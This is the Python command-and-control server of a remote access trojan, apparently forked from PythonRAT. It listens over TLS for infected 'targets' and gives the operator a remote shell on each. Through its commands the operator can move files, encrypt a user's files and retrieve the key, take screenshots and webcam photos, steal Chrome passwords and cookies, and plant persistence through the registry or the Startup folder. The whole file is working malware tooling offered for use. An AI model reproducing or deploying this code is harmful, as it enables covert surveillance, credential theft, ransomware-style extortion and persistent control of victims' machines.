import socket
import json
import os
import threading
from cryptography.fernet import Fernet
import ssl

class Color:
    RESET = '\033[0m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'

    @staticmethod
    def get_color(color_code):
        return color_code + '{}'.format(Color.RESET)
    
def banner(version):
    return((f'''{Color.RED}

    █████      ██░ ██  ▒█████   ▒█████   ██ ▄█▀
  ▓██        ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒ ██▄█▒ 
  ▒████      ░▒██▀▀██ ▒██░  ██▒▒██░  ██▒▓███▄░ 
  ░▓█▒        ░▓█ ░██ ▒██   ██░▒██   ██░▓██ █▄ 
 ▒░▒█░        ░▓█▒░██▓░ ████▓▒░░ ████▓▒░▒██▒ █▄
 ░ ▒ ░         ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒
 ░ ░           ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░
   ░ ░         ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░ 
 ░             ░  ░  ░    ░ ░      ░ ░  ░  ░   
           
     ''') + (
        f'''{Color.YELLOW} version: {version}\n''') + (
        f'''{Color.YELLOW}      by: fishnotphish\n\n''') + (
        f'''{Color.BLACK}      forked from https://github.com/safesploit/PythonRAT by Safesploit\n{Color.RESET}''')
    )

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(target, file_name, type):
    f = open(file_name, 'wb')
    if type == 1:
        target.settimeout(2)
        chunk = target.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout as e:
                break
    elif type == 2:
        target.settimeout(5)
        try:
            chunk = target.recv(10485760)
        except:
            pass

        while chunk:
            f.write(chunk)
            try:
                chunk = target.recv(10485760)
            except:
                break
    target.settimeout(None)
    f.close()
    if file_name.endswith('.key'):
        with open(file_name, 'r') as f:
            key_str = f.read()
        start = key_str.find(",") + 1
        end = key_str.find("=") + 1
        trimmed_key_str = key_str[start:end]

        with open(file_name, 'w') as f:
            f.write(trimmed_key_str)

def download_encrypted_key(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(20)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def pull_image(target, count, type):
    if type == 'webcam':
        directory = './images'
        if not os.path.exists(directory):
            os.makedirs(directory)
        f = open(directory + '/webcam_pic_%d.jpg' % (count), 'wb') 
    elif type == 'screenshot':
        directory = './screenshots'
        if not os.path.exists(directory):
            os.makedirs(directory)
        f = open(directory + '/screenshot_%d.png' % (count), 'wb') 

    target.settimeout(10)
    try:
        chunk = target.recv(10485760)
    except Exception as e:
        print("chunk error:", str(e))
        pass

    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(10485760)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
    count += 1

def server_help_manual():
    print('''\n
    --------------------------------------------------------------------------------------------------------
    Session Commands
    --------------------------------------------------------------------------------------------------------
    quit                                --> Quit Session With The Target
    info                                --> General Host Information
    cd <directory name>                 --> Changes Directory On Target System
    upload <file name>                  --> Upload File To The Target Machine From Working Dir 
    download <file name>                --> Download File From Target Machine
    encrypt <file name>                 --> Encrpyt File in Current Directory and retrieve the key
    encrypt_user_dir <username>         --> Encrypt User Directory Files and retrieve the key
                                            Please remove all spaces from username
                                            timmy turner -> timmyturner
                                            example: encrypt_user_dir tturner
                                            this will hang for 20 seconds
    screenshot                          --> Takes screenshot and sends to server ./screenshots/
    webcam                              --> Takes picture with webcam and sends to ./images/
    start <programName>                 --> Spawn Program Using backdoor e.g. 'start notepad'
    remove_backdoor                     --> Removes backdoor from target!!!
    reg_persist <RegName> <file name>   --> Create Persistence In Registry
                                            copies target file from victim cwd to ~/AppData/Roaming/filename
                                            example: persistence Backdoor windows32.exe
    startup_persist <file name>         --> Create Persistence In Start Up Folder
                                            copies target file from victim cwd to Startup folder
    check                               --> Check If Has User/Administrator Privileges
    \n''')

def c2_help_manual():
    print('''\n
    -------------------------------------------------------------------------------
    Command and Control Manual
    -------------------------------------------------------------------------------

    targets                 --> Prints Active Sessions
    session <session num>   --> Will Connect To Session (background to return)
    clear                   --> Clear Terminal Screen
    exit                    --> Quit ALL Active Sessions and Closes C2 Server!!
    kill <session num>      --> Issue 'quit' To Specified Target Session
    \n''')

def target_communication(target, ip):
    first_iteration = True
    s_count = 0
    w_count = 0
    cwd = ''

    while True:
        if first_iteration == True:
            reliable_send(target, '(Get-Location).Path')
            cwd = reliable_recv(target).strip()
        first_iteration = False

        command = input(f"{Color.RED}* Shell~{ip} {cwd}> {Color.RESET}")
        reliable_send(target, command)
        
        if command == 'quit':
            break
        
        match command.split()[0]:
            case 'cd':
                cwd = reliable_recv(target).strip()
            case 'encrypt':
                if len(command.split()) > 1:
                    download_file(target, f'{command.split()[1]}.key', 1)
            case 'encrypt_user_dir':
                if len(command.split()) > 1:
                    download_encrypted_key(target, f'{command.split()[1]}.key')
            case 'webcam':
                pull_image(target, w_count, 'webcam')
                w_count += 1
            case 'upload':
                if len(command.split()) > 1:
                    upload_file(target, command.split()[1])
            case 'download':
                if len(command.split()) > 1:
                    download_file(target, command.split()[1], 1)
            case 'screenshot':
                pull_image(target, s_count, 'screenshot')
                s_count += 1
            case 'chrome_pass':
                download_file(target, 'passwords.txt', 2)
            case 'chrome_cookies':
                download_file(target, 'cookies.txt', 2)
            case 'help':
                server_help_manual()
            case _:
                result = reliable_recv(target)
                print(result)

def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(f'{Color.RED}{str(ip)} has connected\n{Color.CYAN}[**] Command & Control Center: {Color.RESET}', end="")
        except:
            pass

if __name__ == '__main__':
    targets = []
    ips = []
    stop_flag = False
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    sock = ssl.wrap_socket(sock, server_side=True, keyfile="key.pem", certfile="cert.pem") # add your own 
    sock.bind(('SERVER IP', 5555))
    sock.listen(5)
    t1 = threading.Thread(target=accept_connections)
    t1.start()
    print(banner("v1.01"))
    print(f'{Color.YELLOW}Run "help" command to see the usage manual{Color.RESET}')
    print(f'{Color.GREEN}[+] Waiting For The Incoming Connections ...{Color.RESET}')

    while True:
        try:
            command = input(f'{Color.CYAN}[**] Command & Control Center: {Color.RESET}')
            if command == 'targets':
                counter = 0
                for ip in ips:
                    print(f'{Color.RED}Session {str(counter)} --- {str(ip)}{Color.RESET}')
                    counter += 1
            elif command == 'clear':
                os.system('clear')
            elif command[:7] == 'session':
                try:
                    num = int(command[8:])
                    tarnum = targets[num]
                    tarip = ips[num]
                    target_communication(tarnum, tarip)
                except:
                    print(f'{Color.RED}\n[-] No Session Under That ID Number{Color.RESET}')
            elif command == 'exit':
                for target in targets:
                    reliable_send(target, 'quit')
                    target.close()
                sock.close()
                stop_flag = True
                t1.join()
                break
            elif command[:4] == 'kill':
                targ = targets[int(command[5:])]
                ip = ips[int(command[5:])]
                reliable_send(targ, 'quit')
                targ.close()
                targets.remove(targ)
                ips.remove(ip)
            elif command[:4] == 'help':
                c2_help_manual()
            else:
                print(f'{Color.RED}[!!] Command Doesnt Exist{Color.RESET}')
        except (KeyboardInterrupt, SystemExit):
            if input('\nDo you want to exit? yes/no: ') == 'yes':
                sock.close()
                print(f'{Color.YELLOW}\n[-] C2 Socket Closed! Bye!!{Color.RESET}')
                break
        except ValueError as e:
            print(f'{Color.RED}[!!] ValueError: {str(e)}{Color.RESET}')
            continue